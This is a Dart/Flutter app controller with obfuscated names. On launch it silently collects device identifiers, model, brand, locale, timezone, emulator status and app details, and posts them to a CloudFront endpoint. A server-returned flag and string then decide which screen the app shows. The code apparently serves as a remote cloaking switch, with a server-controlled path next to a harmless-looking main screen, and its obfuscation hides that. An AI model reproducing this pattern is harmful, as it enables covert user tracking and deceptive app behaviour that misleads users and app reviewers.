import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CallingWriteLogic extends GetxController {

  var zlwyduvfxc = RxBool(false);
  var wetdgpyvhl = RxBool(true);
  var xrptbw = RxString("");
  var alba = RxBool(false);
  var sporer = RxBool(true);
  final bikvuszy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ntoz();
  }


  Future<void> ntoz() async {
    alba.value = true;
    sporer.value = true;
    wetdgpyvhl.value = false;

    bikvuszy.post("https://d2106h8u6gk27i.cloudfront.net/oHDvNrGO",data: await phimagcjtd()).then((value) {
      var ypmgjkfa = value.data["ypmgjkfa"] as String;
      var nervodz = value.data["nervodz"] as bool;
      if (nervodz) {
        xrptbw.value = ypmgjkfa;
        florence();
      } else {
        powlowski();
      }
    }).catchError((e) {
      wetdgpyvhl.value = true;
      sporer.value = true;
      alba.value = false;
    });
  }

  Future<Map<String, dynamic>> phimagcjtd() async {
    final DeviceInfoPlugin kypltwi = DeviceInfoPlugin();
    PackageInfo zpxr_nkuedlj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vbulgky = Platform.localeName;
    var dtKgAfqk = currentTimeZone;

    var eLXy = zpxr_nkuedlj.packageName;
    var eMlRTw = zpxr_nkuedlj.version;
    var GWBwDn = zpxr_nkuedlj.buildNumber;

    var PXQGoU = zpxr_nkuedlj.appName;
    var HKQszV = "";
    var lKObQV  = "";
    var YJPHCdst = "";
    var delbertZboncak = "";
    var thoraShanahan = "";
    var billieRohan = "";
    var susannaRunolfsdottir = "";
    var boWintheiser = "";
    var nicoGoldner = "";
    var louisaHegmann = "";
    var joGraham = "";


    var GrMh = "";
    var YLQiMw = false;

    if (GetPlatform.isAndroid) {
      GrMh = "android";
      var ybpixzu = await kypltwi.androidInfo;

      YJPHCdst = ybpixzu.brand;

      HKQszV  = ybpixzu.model;
      lKObQV = ybpixzu.id;

      YLQiMw = ybpixzu.isPhysicalDevice;
    }
    if (GetPlatform.isIOS) {
      GrMh = "ios";
      var bwrzgndy = await kypltwi.iosInfo;
      YJPHCdst = bwrzgndy.name;
      HKQszV = bwrzgndy.model;

      lKObQV = bwrzgndy.identifierForVendor ?? "";
      YLQiMw  = bwrzgndy.isPhysicalDevice;
    }

    var res = {
      "PXQGoU": PXQGoU,
      "susannaRunolfsdottir" : susannaRunolfsdottir,
      "GWBwDn": GWBwDn,
      "eLXy": eLXy,
      "HKQszV": HKQszV,
      "YJPHCdst": YJPHCdst,
      "nicoGoldner" : nicoGoldner,
      "lKObQV": lKObQV,
      "vbulgky": vbulgky,
      "louisaHegmann" : louisaHegmann,
      "GrMh": GrMh,
      "YLQiMw": YLQiMw,
      "delbertZboncak" : delbertZboncak,
      "eMlRTw": eMlRTw,
      "thoraShanahan" : thoraShanahan,
      "dtKgAfqk": dtKgAfqk,
      "billieRohan" : billieRohan,
      "boWintheiser" : boWintheiser,
      "joGraham" : joGraham,

    };
    return res;
  }

  Future<void> powlowski() async {
    Get.offNamed("/voiceMain");
  }

  Future<void> florence() async {
    Get.offNamed("/callingStep");
  }
}
